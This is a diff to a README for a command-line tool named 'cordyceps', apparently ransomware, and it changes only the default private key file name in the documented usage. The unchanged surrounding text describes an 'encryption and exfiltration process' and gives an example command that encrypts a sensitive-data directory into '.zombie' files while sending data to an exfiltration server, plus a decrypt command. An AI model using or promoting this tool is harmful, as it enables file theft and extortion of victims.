@@ -71,7 +71,7 @@ Use the `encrypt` command to begin the encryption and exfiltration process.
 Use the `decrypt` command to restore `.zombie` files using the provided private key.
 
 - `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. Default: current directory (`.`).
-- `-k, --key <PATH>`: Provides the file path to the server's private key (e.g., `server_ed25519_private.key`), which is essential for decryption. Default: `server_ed25519_private.key`.
+- `-k, --key <PATH>`: Provides the file path to the server's private key (e.g., `master_ed25519_private.key`), which is essential for decryption. Default: `master_ed25519_private.key`.
 
 ### Examples
 #### Encryption Example
@@ -82,10 +82,10 @@ cordyceps encrypt -p /path/to/sensitive_data --server https://your.exfil.server:
 ```
 
 #### Decryption Example
-This command will decrypt `.zombie` files in the `/path/to/zombie_files` directory using the private key located at `/path/to/your/server_ed25519_private.key`.
+This command will decrypt `.zombie` files in the `/path/to/zombie_files` directory using the private key located at `/path/to/your/master_ed25519_private.key`.
 
 ```sh
-cordyceps decrypt -p /path/to/zombie_files -k /path/to/your/server_ed25519_private.key
+cordyceps decrypt -p /path/to/zombie_files -k /path/to/your/master_ed25519_private.key
 ```
 
 
